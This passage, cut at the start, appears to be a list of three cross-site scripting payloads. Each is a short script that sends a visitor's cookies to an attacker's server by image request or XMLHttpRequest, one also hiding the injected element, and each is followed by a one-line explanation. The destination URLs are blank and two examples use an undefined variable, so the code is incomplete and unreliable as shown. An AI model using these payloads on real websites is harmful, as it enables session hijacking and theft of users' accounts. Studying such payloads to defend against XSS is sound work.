var img = new Image();
img.src = "" + encodeURIComponent(stolen_cookie);
document.body.appendChild(img);
alert("Your session is hijacked");
</script>
```
This payload demonstrates how an attacker might attempt to steal session cookies from the user and send them to their server.

2. Example 2:
```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cookies=" + encodeURIComponent(stolen_cookie));
document.getElementById("xssPayload").style.display = "none";
</script>
```
This payload shows how an attacker can use an XMLHttpRequest to send stolen cookies to their server and hide the injected content.

3. Example 3:
```
<script>
var img = new Image();
img.src = "" + encodeURIComponent(document.cookie);
document.body.appendChild(img);
alert("Your session is hijacked, cookies are stolen!");
</script>
```
This payload demonstrates a potentially harmful scenario where the attacker steals cookies and sends them to a remote server.

